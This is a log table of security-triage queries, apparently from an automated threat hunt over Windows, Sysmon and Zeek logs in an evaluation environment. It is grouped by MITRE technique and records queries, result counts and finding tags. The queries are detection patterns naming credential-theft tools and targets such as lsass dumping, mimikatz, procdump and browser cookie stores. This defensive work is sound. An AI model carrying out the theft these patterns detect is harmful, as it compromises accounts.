| q-d85af01ac4 | triage T1056 step 2 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (win.ScriptBlockText LIKE \"*lsass*\" OR win.ScriptBlockText LIKE \"*MiniDump*\" OR win.ScriptBlockText LIKE \"*Credential*\" OR win.ScriptBlockText LIKE \… | 3 | F09 |
| q-a4f902a8bf | triage T1056 step 3 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-ae6815e51f | triage T1056 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND process.pid == 2976 \| KEEP @timestamp, host.name, user.name, process.executable, process.command_line, process.parent.executable, _id, _index \| LIMIT 10"} | 1 | F08, F11, F12 |
| q-a51215cbb6 | triage T1056 step 4 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-b060d41738 | triage T1056 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (process.command_line LIKE \"*lsass*\" OR process.command_line LIKE \"*MiniDump*\" OR process.command_line LIKE \"*monkey*\" OR process.command_line LIKE \"*Invok… | 3 |  |
| q-63a00d7be9 | triage T1056 step 5 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4656\" AND win.ObjectName LIKE \"*lsass*\" AND win.ProcessId == \"2976\" \| KEEP @timestamp, host.name, user.name, process.executable, win.ObjectName, win.AccessMask, w… | 0 |  |
| q-6a57153b99 | triage T1056 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND win.SourceImage LIKE \"*PowerShell*\" AND win.TargetImage LIKE \"*lsass*\" \| KEEP @timestamp, host.name, win.SourceImage, win.TargetImage, win.GrantedAccess, wi… | 4 |  |
| q-6b0c072a40 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-44c3fa0b03 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-640a15df7f | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-9e3e75aac5 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-4d95b001b5 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-31e5a58345 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-7e5e00aab9 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-70a924279c | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-45b1a96eb7 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-b2292590b9 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-e7552e1bd1 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-a2a4635d2f | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-c9faa54dec | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-e78d289f8e | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-7d4ff067bc | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-e3dd87ffa2 | triage T1110 step 1 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None | F13, F16 |
| q-0bd903a4e2 | triage T1110 step 1 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV19Rnb"} | None | F13, F16 |
| q-9c0d7a20eb | triage T1110 step 1 | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8RS"} | None | F14 |
| q-e207b3cc0a | triage T1110 step 1 | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8TL"} | None |  |
| q-e6f11680a1 | triage T1110 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND win.TargetImage LIKE \"*lsass*\" \| STATS cnt = COUNT(*) BY process.executable, win.GrantedAccess, host.name \| SORT cnt DESC \| LIMIT 30"} | 18 |  |
| q-0c191ebe0c | triage T1110 step 2 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4663\" AND win.ObjectName LIKE \"*SAM*\" \| KEEP @timestamp, host.name, win.ObjectName, win.ProcessName, win.AccessMask, user.name, _id, _index \| LIMIT 20"} | 0 |  |
| q-e349042390 | triage T1110 step 3 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4663\" AND win.ObjectName == \"SAM\" \| KEEP @timestamp, host.name, win.ObjectName, win.ProcessName, win.AccessMask, win.AccessList, user.name, _id, _index \| LIMIT 20"… | 0 |  |
| q-7180d5b718 | triage T1110 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND win.TargetImage LIKE \"*lsass*\" AND process.executable LIKE \"*PowerShell*\" \| KEEP @timestamp, host.name, process.executable, process.command_line, win.Grante… | 4 |  |
| q-4e7e7e9cd3 | triage T1110 step 4 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None | F15 |
| q-b72c86438d | triage T1110 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (win.ScriptBlockText LIKE \"*lsass*\" OR win.ScriptBlockText LIKE \"*Credential*\" OR win.ScriptBlockText LIKE \"*Password*\" OR win.ScriptBlockText LIKE \… | 19 |  |
| q-ab4cfce14f | triage T1110 step 5 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None | F17 |
| q-e2c5026f02 | triage T1110 step 5 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (win.ScriptBlockText LIKE \"*SecureString*\" OR win.ScriptBlockText LIKE \"*Credential*\" OR win.ScriptBlockText LIKE \"*Get-Process*UserName*\" OR win.Scr… | 6 |  |
| q-2c31450e71 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-e6ebd1dd9c | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV19Rnb"} | None |  |
| q-5ec21e181b | triage T1110 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8RS"} | None |  |
| q-bc62572a56 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-363ccba2df | triage T1110 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-60711977fd | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-9c768ee45d | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV19Rnb"} | None |  |
| q-ea11a05003 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-3c7cbc7eb0 | triage T1111 step 1 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None | F18 |
| q-4d624c4641 | triage T1111 step 1 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn01NG"} | None |  |
| q-50c2a566a2 | triage T1111 step 1 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4648", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 15 |  |
| q-091773eb67 | triage T1111 step 1 | aggregate | {"dataset": "windows.security", "field": "win.LogonProcessName", "query": "event.code:4624 AND win.LogonType:10", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 2 |  |
| q-018403046a | triage T1111 step 2 | search | {"dataset": "windows.security", "query": "event.code:4624 AND win.LogonType:10", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "win.LogonType", "win.LogonProcessName", "win.AuthenticationPackageName", "source.ip", "win.… | 2 | F18 |
| q-8ae910f88c | triage T1111 step 2 | search | {"dataset": "windows.security", "query": "event.code:4624 AND win.LogonType:2", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "win.LogonType", "win.LogonProcessName", "win.AuthenticationPackageName", "win.IpAddress"], "… | 15 |  |
| q-cbb50aeb8f | triage T1111 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND (TO_LOWER(win.TargetImage) LIKE \"*lsass*\" OR TO_LOWER(win.TargetImage) LIKE \"*winlogon*\" OR TO_LOWER(win.TargetImage) LIKE \"*credential*\") \| KEEP @timesta… | 50 | F18 |
| q-30f87f343f | triage T1111 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*smartcard*\" OR TO_LOWER(process.command_line) LIKE \"*otp*\" OR TO_LOWER(process.command_line) LIKE \"*mfa*\" OR TO_LOWER… | 8 | F18 |
| q-18d255ed97 | triage T1111 step 3 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4688\" AND (TO_LOWER(process.command_line) LIKE \"*psexec*\" OR TO_LOWER(process.command_line) LIKE \"*smartcard*\" OR TO_LOWER(process.command_line) LIKE \"*mfa*\" OR … | 4 |  |
| q-a1a99a5c87 | triage T1111 step 3 | aggregate | {"dataset": "windows.security", "field": "win.AuthenticationPackageName", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 297 |  |
| q-92c4cbe34c | triage T1111 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"13\" AND (TO_LOWER(registry.path) LIKE \"*smartcard*\" OR TO_LOWER(registry.path) LIKE \"*scfilter*\" OR TO_LOWER(registry.path) LIKE \"*rdp*\" OR TO_LOWER(registry.path)… | 29 | F18 |
| q-69c3b0eb1b | triage T1111 step 4 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE TO_LOWER(message) LIKE \"*smart card*\" OR TO_LOWER(message) LIKE \"*smartcard*\" OR TO_LOWER(message) LIKE \"*mfa*\" OR TO_LOWER(message) LIKE \"*multi-factor*\" OR TO_LOWER(message) LIK… | 0 |  |
| q-67785f7ad3 | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPDyDoS"} | None |  |
| q-1b49e5e83d | triage T1111 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-51ac1d7386 | triage T1111 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn0lP2"} | None |  |
| q-9c95a9ec78 | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO3jiqC"} | None |  |
| q-cf1f0b3ad0 | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9rO3Z"} | None |  |
| q-f8363e6d0a | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOYDnci"} | None |  |
| q-742d9e9d44 | triage T1187 step 1 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"http\" AND (http.request.method == \"PROPFIND\" OR http.request.method == \"OPTIONS\" OR http.request.method == \"MOVE\") \| KEEP @timestamp, source.ip, destination.ip, http.requ… | 36 | F19 |
| q-6a4a855133 | triage T1187 step 1 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"conn\" AND (destination.port == 445 OR destination.port == 139) \| KEEP @timestamp, source.ip, destination.ip, destination.port, network.bytes, zeek.conn_state, _id, _index \| SO… | 50 | F20 |
| q-c9efa998d6 | triage T1187 step 2 | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgN"} | None | F19 |
| q-fab0807247 | triage T1187 step 2 | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjx"} | None | F19 |
| q-24ebc37987 | triage T1187 step 2 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"smb_files\" OR event.action == \"smb_mapping\" \| KEEP @timestamp, source.ip, destination.ip, zeek.filename, zeek.path, zeek.action, zeek.share_type, _id, _index \| SORT @timesta… | 23 | F20 |
| q-0687dcd171 | triage T1187 step 3 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"files\" AND (source.ip == \"10.0.1.4\" OR destination.ip == \"10.0.1.4\") \| KEEP @timestamp, source.ip, destination.ip, zeek.filename, zeek.mime_type, zeek.md5, _id, _index \| S… | 0 |  |
| q-dccb626e70 | triage T1187 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == 1 AND (TO_LOWER(process.command_line) LIKE \"*webdav*\" OR TO_LOWER(process.command_line) LIKE \"*192.168.0.4*\" OR TO_LOWER(process.command_line) LIKE \"*\\\\\\\\192.168*\… | ERROR |  |
| q-b9113cb48e | triage T1187 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*webdav*\" OR TO_LOWER(process.command_line) LIKE \"*192.168.0.4*\" OR TO_LOWER(process.command_line) LIKE \"*davclnt*\") \… | 5 |  |
| q-d0d90fa676 | triage T1187 step 4 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"files\" \| KEEP @timestamp, source.ip, destination.ip, zeek.filename, zeek.mime_type, zeek.md5, _id, _index \| SORT @timestamp ASC \| LIMIT 30"} | 30 |  |
| q-bbb7d4c417 | triage T1187 step 5 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None | F19 |
| q-5186bede9a | triage T1187 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND host.name == \"scranton.dmevals.local\" \| KEEP @timestamp, user.name, process.executable, process.command_line, process.parent.executable, _id, _index \| SORT @t… | 40 | F19 |
| q-fc4bdecd1a | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-def7211b33 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-3bcc9c8f44 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-08e16ac421 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-216f3cd4db | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgN"} | None |  |
| q-699bc1a771 | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgN"} | None |  |
| q-3d24385de0 | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgN"} | None |  |
| q-faffe1853f | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjx"} | None |  |
| q-a4f34bb43a | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYjF"} | None |  |
| q-da4b36efdc | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_psP"} | None |  |
| q-6e443b971a | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYih"} | None |  |
| q-c8d3b1b0d6 | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYih"} | None |  |
| q-f81589fdc4 | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrogj"} | None |  |
| q-18caaf265e | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYir"} | None |  |
| q-c0da24f906 | triage T1212 step 1 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 326 |  |
| q-59a6797d7b | triage T1212 step 1 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 326 |  |
| q-9245b94e56 | triage T1212 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.GrantedAccess:0x1fffff OR win.GrantedAccess:0x101001 OR win.GrantedAccess:0x1f3fff OR win.GrantedAccess:0x1000000 OR win.GrantedAccess:0x3000 OR win.GrantedAccess:0x1400… | 33 | F21 |
| q-21b76e0958 | triage T1212 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None | F21 |
| q-093e491196 | triage T1212 step 3 | search | {"dataset": "windows.powershell", "query": "event.code:4104", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "win.ScriptBlockText", "user.name"], "size": 20, "sort": "asc"} | 414 |  |
| q-e61862c3cb | triage T1212 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE host.name == \"scranton.dmevals.local\" AND @timestamp >= \"2020-05-02T03:04:00.000Z\" AND @timestamp <= \"2020-05-02T03:07:00.000Z\" \| KEEP @timestamp, host.name, user.name, win.Sc… | 415 |  |
| q-085a014f29 | triage T1212 step 4 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None | F21 |
| q-435539c472 | triage T1212 step 5 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE host.name == \"scranton.dmevals.local\" AND @timestamp >= \"2020-05-02T03:05:00.000Z\" AND @timestamp <= \"2020-05-02T03:06:30.000Z\" AND win.ScriptBlockText IS NOT NULL \| KEEP @tim… | 12 |  |
| q-1c3b700661 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-b2290c6691 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-eb1dad43a8 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-9a90a9083a | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-4e60def2f4 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-20bbc64a2a | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-bf90156d30 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-b0d86a8ae2 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-fd3cb0d74a | triage T1212 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV3-aVk"} | None |  |
| q-6e4acd8002 | triage T1212 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYiq"} | None |  |
| q-f0b99fee31 | triage T1539 step 1 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None | F25 |
| q-f4946aacbb | triage T1539 step 1 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8Frba"} | None | F24 |
| q-ab2e023ad3 | triage T1539 step 1 | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog-"} | None | F27 |
| q-9fe8542b60 | triage T1539 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(win.TargetFilename) LIKE \"*cookies*\" OR TO_LOWER(win.TargetFilename) LIKE \"*login data*\" OR TO_LOWER(win.TargetFilename) LIKE \"*web data*\" OR TO_… | 1 |  |
| q-86d03de5bc | triage T1539 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND (TO_LOWER(win.TargetImage) LIKE \"*chrome*\" OR TO_LOWER(win.TargetImage) LIKE \"*firefox*\" OR TO_LOWER(win.TargetImage) LIKE \"*iexplore*\" OR TO_LOWER(win.Tar… | 374 | F26 |
| q-87cd8b68bf | triage T1539 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*cookie*\" OR TO_LOWER(process.command_line) LIKE \"*login data*\" OR TO_LOWER(process.command_line) LIKE \"*web data*\" OR… | 5 | F24 |
| q-a0c42b850f | triage T1539 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(win.TargetFilename) LIKE \"*appdata*local*google*\" OR TO_LOWER(win.TargetFilename) LIKE \"*appdata*local*microsoft*edge*\" OR TO_LOWER(win.TargetFilen… | 4 | F26 |
| q-4d63f4fc09 | triage T1539 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.executable) LIKE \"*mimikatz*\" OR TO_LOWER(process.executable) LIKE \"*procdump*\" OR TO_LOWER(process.executable) LIKE \"*pypykatz*\" OR TO_LO… | 1 | F26 |
| q-fb6129d3ab | triage T1539 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8Frba"} | None |  |
| q-64e27bdd47 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8Frba"} | None |  |
| q-ccd309c9d3 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-03b649eba0 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-a20bffd448 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-e3ee20f65d | triage T1539 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUmm"} | None |  |
| q-40e1daa3a1 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUmm"} | None |  |
| q-69d634d595 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOZEq4k"} | None |  |
| q-47d8abb223 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-51da274d80 | triage T1539 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog-"} | None |  |
| q-9fe92b5981 | triage T1539 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog-"} | None |  |
| q-0fdfa1e5c0 | triage T1552 step 1 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbkGF"} | None | F29 |
| q-a1c84e836a | triage T1552 step 1 | search | {"dataset": "windows.sysmon", "query": "process.executable:*accesschk* OR process.executable:*sdelete* OR process.executable:*PsExec*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "process.executable", "process.comma… | 529 |  |
| q-f320aeb121 | triage T1552 step 2 | search | {"dataset": "windows.sysmon", "query": "process.executable:*accesschk*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "process.executable", "process.command_line", "user.name", "win.TargetFilename", "win.TargetObject"… | 1 |  |
| q-552464af46 | triage T1552 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*passwordsDB* OR process.command_line:*password* OR process.command_line:*credential*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "pro… | 0 |  |
| q-792a13ad0e | triage T1552 step 3 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND process.executable:*sdelete64*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "process.executable", "process.command_line", "user.name", "win.TargetFilename"], … | 6 | F32 |
| q-b91d182dac | triage T1552 step 3 | search | {"dataset": "windows.security", "query": "win.ObjectName:*GptTmpl* OR win.ObjectName:*Groups.xml* OR win.ObjectName:*sysvol* OR win.RelativeTargetName:*GptTmpl*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "process.… | 3 | F30 |
| q-0eb3a0f74c | triage T1552 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*password*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*credential*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*acce… | 7 | F28 |
| q-78278dd37d | triage T1552 step 4 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (win.TargetFilename:*victim* OR win.TargetFilename:*Draft* OR win.TargetFilename:*working* OR win.TargetFilename:*3aka3*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "eve… | 3 |  |
| q-b92fa6a59a | triage T1552 step 5 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None | F28 |
| q-17723d7b78 | triage T1552 step 5 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None | F28 |
| q-13d1184e9e | triage T1552 step 6 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*accesschk*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*passwordsdb*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*in… | 5 | F28, F29 |
| q-b30946f2cd | triage T1552 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
